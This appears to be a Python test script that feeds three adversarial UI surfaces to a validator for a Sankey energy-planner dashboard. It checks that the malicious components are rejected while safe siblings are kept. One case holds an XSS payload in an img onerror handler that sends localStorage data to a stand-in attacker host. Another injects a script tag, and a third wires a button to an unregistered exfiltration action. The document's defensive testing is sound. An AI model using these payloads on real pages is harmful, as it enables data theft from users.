"""Adversarial surfaces against the Sankey energy planner wall.

Each case breaks one invariant. The validator names it and keeps safe siblings.
Run: ``uv run python proofs/adversarial_energy.py``
"""
from __future__ import annotations

import json
from pathlib import Path

from s13code.ui.validator import validate_surface

ROOT = Path(__file__).resolve().parent
OUT = ROOT / "adversarial_energy.json"

CASES = [
    {
        "name": "raw-html-type",
        "expect_invariant": "catalog",
        "surface": {
            "root": "root",
            "components": [
                {"id": "root", "type": "Column", "children": ["ok", "evil"]},
                {"id": "ok", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
                {
                    "id": "evil",
                    "type": "RawHtml",
                    "html": "<img src=x onerror=\"fetch('https://attacker.example/e?m='+localStorage.memoryHandle)\">",
                },
            ],
            "dataModel": {"title": "Household energy"},
        },
    },
    {
        "name": "markup-in-sankey-caption",
        "expect_invariant": "data-not-code",
        "surface": {
            "root": "root",
            "components": [
                {"id": "root", "type": "Column", "children": ["ok", "evil"]},
                {"id": "ok", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
                {
                    "id": "evil",
                    "type": "SankeyDiagram",
                    "title": "Flow",
                    "nodes": {"$bind": "/flow_nodes"},
                    "links": {"$bind": "/flow_links"},
                    "caption": "<script>steal()</script>",
                },
            ],
            "dataModel": {
                "title": "Household energy",
                "flow_nodes": [{"id": "grid", "label": "Grid"}, {"id": "heat", "label": "Heating"}],
                "flow_links": [{"source": "grid", "target": "heat", "value": 100}],
            },
        },
    },
    {
        "name": "unregistered-action",
        "expect_invariant": "event",
        "surface": {
            "root": "root",
            "components": [
                {"id": "root", "type": "Column", "children": ["ok", "evil"]},
                {"id": "ok", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
                {
                    "id": "evil",
                    "type": "Button",
                    "label": "Export meter dump",
                    "onPress": {"action": "exfiltrate_meter"},
                },
            ],
            "dataModel": {"title": "Household energy"},
        },
    },
]


def main() -> None:
    results = []
    for case in CASES:
        result = validate_surface(case["surface"])
        invariants = sorted({r.invariant for r in result.rejections})
        ok_sibling = any(c.get("type") == "Text" for c in result.accepted)
        results.append(
            {
                "name": case["name"],
                "expect_invariant": case["expect_invariant"],
                "ok": result.ok,
                "invariants": invariants,
                "rejections": [r.as_dict() for r in result.rejections],
                "accepted_types": sorted({c.get("type") for c in result.accepted}),
                "safe_sibling_survived": ok_sibling,
                "matched": case["expect_invariant"] in invariants and ok_sibling and not result.ok,
            }
        )
    payload = {
        "description": "Sankey energy planner adversarial suite: catalog, data-not-code, event.",
        "all_matched": all(row["matched"] for row in results),
        "cases": results,
    }
    OUT.write_text(json.dumps(payload, indent=2) + "\n")
    print(json.dumps({"wrote": str(OUT), "all_matched": payload["all_matched"]}, indent=2))
    if not payload["all_matched"]:
        raise SystemExit(1)


if __name__ == "__main__":
    main()
